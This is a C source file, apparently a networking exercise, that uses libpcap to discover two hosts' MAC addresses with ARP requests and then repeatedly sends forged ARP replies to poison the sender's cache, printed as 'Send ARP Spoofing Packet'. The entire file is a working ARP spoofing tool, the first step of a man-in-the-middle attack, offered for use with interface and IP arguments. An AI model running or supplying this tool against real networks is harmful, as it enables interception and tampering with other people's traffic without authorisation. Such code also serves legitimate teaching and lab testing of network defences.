#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>


#define HARDWARE_LEN 6
#define PROTOCOL_LEN 4
#define ETHER_TYPE_ARP 0x0806
#define HARDWARE_TYPE 0x0001
#define PROTOCOL_TYPE 0x0800
#define OPERATION_REQ 0x0001
#define OPERATION_REP 0x0002

struct sniff_ethernet{
	uint8_t ether_dhost[HARDWARE_LEN];
	uint8_t ether_shost[HARDWARE_LEN];
	uint16_t ether_type;
};

struct arp_packet{
	uint8_t destination_mac[HARDWARE_LEN];
	uint8_t source_mac[HARDWARE_LEN];
	uint16_t ether_type;
	uint16_t hardware_type;
	uint16_t protocol_type;
	uint8_t hardware_len;
	uint8_t protocol_len;
	uint16_t operation;
	uint8_t sender_hardware_addr[HARDWARE_LEN];
	uint8_t sender_ip_addresss[PROTOCOL_LEN];
	uint8_t target_hardware_addr[HARDWARE_LEN];
	uint8_t target_ip_addresss[PROTOCOL_LEN];
};

void usage() {
	printf("Please execute like this\n ./send_arp <interface> <sender_ip> <target_ip>\n");;
}

void * get_mac_address(uint8_t * my_MAC)
{
	unsigned int my_MAC_fetch[6];
	FILE *fp;
	fp = fopen("/sys/class/net/eth0/address","r");
	fscanf(fp, "%x:%x:%x:%x:%x:%x",&my_MAC_fetch[0],&my_MAC_fetch[1],&my_MAC_fetch[2],&my_MAC_fetch[3],&my_MAC_fetch[4],&my_MAC_fetch[5]);
	for(int i = 0; i<6 ; i++)
	{
		my_MAC[i] = (uint8_t)my_MAC_fetch[i];
	}
	fclose(fp);

}



void * get_ip_address(uint8_t * my_ipaddr, char * interface)
{
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);
	uint8_t num = 0;
	int cnt = 0;
	int i=0;
	if(ioctl(s, SIOCGIFADDR, &ifr) < 0)
	{
		printf("Error");
	} else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
		//sizeof(struct sockaddr)
		do{
			if(ipstr[i] == '.' || ipstr[i] == '\0')
			{
				my_ipaddr[cnt++] = num;
				num = 0;
			}else
			{	
				num = num * 10 + (ipstr[i] - '0');
			}
			i++;
		}while(cnt != 4);
	}
}


struct arp_packet request_packet(struct arp_packet packet, uint8_t * my_MAC,uint8_t * my_ipaddr, char * argv)
{
	for(int i=0; i<6; i++)
	{
		packet.source_mac[i] = my_MAC[i];
		packet.sender_hardware_addr[i] = my_MAC[i];
		packet.destination_mac[i] = '\xff';
		packet.target_hardware_addr[i] ='\x00';
	}
	
	packet.ether_type = htons(ETHER_TYPE_ARP);
	packet.hardware_type = htons(HARDWARE_TYPE);
	packet.protocol_type = htons(PROTOCOL_TYPE);
	packet.hardware_len = HARDWARE_LEN;
	packet.protocol_len = PROTOCOL_LEN;
	packet.operation = htons(OPERATION_REQ);

	packet.sender_ip_addresss[0] = my_ipaddr[0];
	packet.sender_ip_addresss[1] = my_ipaddr[1];
	packet.sender_ip_addresss[2] = my_ipaddr[2];
	packet.sender_ip_addresss[3] = my_ipaddr[3];
		
	uint32_t num = inet_addr(argv);
	packet.target_ip_addresss[0] = num;
	packet.target_ip_addresss[1] = num >> 8;
	packet.target_ip_addresss[2] = num >> 16;
	packet.target_ip_addresss[3] = num >> 24;

	return packet;
}

struct arp_packet response_packet(struct arp_packet packet, uint8_t * my_MAC, char * sender_ip, char * target_ip)
{
	for(int i=0; i<6; i++)
	{
		packet.source_mac[i] = my_MAC[i];
		packet.sender_hardware_addr[i] = my_MAC[i];
		packet.target_hardware_addr[i] = packet.destination_mac[i];
	}
	
	packet.ether_type = htons(ETHER_TYPE_ARP);
	packet.hardware_type = htons(HARDWARE_TYPE);
	packet.protocol_type = htons(PROTOCOL_TYPE);
	packet.hardware_len = HARDWARE_LEN;
	packet.protocol_len = PROTOCOL_LEN;
	packet.operation = htons(OPERATION_REP);

	uint32_t num = inet_addr(sender_ip);
	packet.sender_ip_addresss[0] = num;
	packet.sender_ip_addresss[1] = num >> 8;
	packet.sender_ip_addresss[2] = num >> 16;
	packet.sender_ip_addresss[3] = num >> 24;
		
	num = inet_addr(target_ip);
	packet.target_ip_addresss[0] = num;
	packet.target_ip_addresss[1] = num >> 8;
	packet.target_ip_addresss[2] = num >> 16;
	packet.target_ip_addresss[3] = num >> 24;

	return packet;
}

void send_packet(struct arp_packet packet, pcap_t* handle)
{
	uint8_t *p = (uint8_t *)&packet;
	struct pacp_pkthdr *header;
	if(pcap_sendpacket(handle, p, 42) != 0)
		fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));
}

int main(int argc, char* argv[])
{
	if (argc != 4)
	{
		usage();
		return -1;
	}

	uint8_t my_MAC[6];
	uint8_t my_ipaddr[4];
	struct arp_packet packet, rep_packet_for_sender, rep_packet_for_target;

	get_mac_address(my_MAC);
	get_ip_address(my_ipaddr, argv[1]);

	
	char* dev = argv[1];
  	char errbuf[PCAP_ERRBUF_SIZE];
  	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

  	if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  	}
  	
	uint8_t *p = (uint8_t *)&packet;
  	printf("send arp request packet to know sender MAC--------------------------------------\n");
	packet = request_packet(packet, my_MAC, my_ipaddr, argv[2]);

	send_packet(packet, handle);
	/*uint8_t *p = (uint8_t *)&packet;
	struct pacp_pkthdr *header;
	if(pcap_sendpacket(handle, p, 42) != 0)
		fprintf(stderr, "\nError sending the packet! : %s\n", pcap_geterr(handle));
	*/
	while(true)	
	{
		struct pcap_pkthdr* header;
		const u_char * packet2;
		int res = pcap_next_ex(handle, &header, &packet2);

	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;
	    
	    struct sniff_ethernet *ethernet;
		ethernet = (struct sniff_ethernet*)(packet2);
		for(int i=0;i<HARDWARE_LEN;i++)
			rep_packet_for_sender.destination_mac[i] = ethernet->ether_shost[i];
		printf("Sender MAC is %x:%x:%x:%x:%x:%x\n", ethernet->ether_shost[0],ethernet->ether_shost[1],ethernet->ether_shost[2],ethernet->ether_shost[3],ethernet->ether_shost[4],ethernet->ether_shost[5]);
		break;
	}
	rep_packet_for_sender = response_packet(rep_packet_for_sender, my_MAC, argv[3], argv[2]);

	printf("send arp request packet to know target MAC--------------------------------------\n");
    
    packet = request_packet(packet, my_MAC, my_ipaddr, argv[3]);
	send_packet(packet, handle);

	while(true)
	{
		struct pcap_pkthdr* header;
		const u_char * packet2;
		int res = pcap_next_ex(handle, &header, &packet2);

	    if (res == 0) continue;
	    if (res == -1 || res == -2) break;
	    
	    struct sniff_ethernet *ethernet;
		ethernet = (struct sniff_ethernet*)(packet2);
		for(int i=0;i<HARDWARE_LEN;i++)
			rep_packet_for_target.destination_mac[i] = ethernet->ether_shost[i];
		printf("Target MAC is %x:%x:%x:%x:%x:%x\n", ethernet->ether_shost[0],ethernet->ether_shost[1],ethernet->ether_shost[2],ethernet->ether_shost[3],ethernet->ether_shost[4],ethernet->ether_shost[5]);
			break;
	}

	rep_packet_for_target = response_packet(rep_packet_for_target, my_MAC, argv[2], argv[3]);

	while(1)
	{
		int cnt;
		printf("Send ARP Spoofing Packet\n");
		//uint8_t *arp_spoof_sender = (uint8_t *)&rep_packet_for_sender;
		struct pacp_pkthdr *header;
		send_packet(rep_packet_for_sender,handle);
		printf("Send packet one more time? Enter 1 \n Enter :");
		scanf("%d", &cnt);
		if(cnt != 1)
			break;
	}

	return 0;
}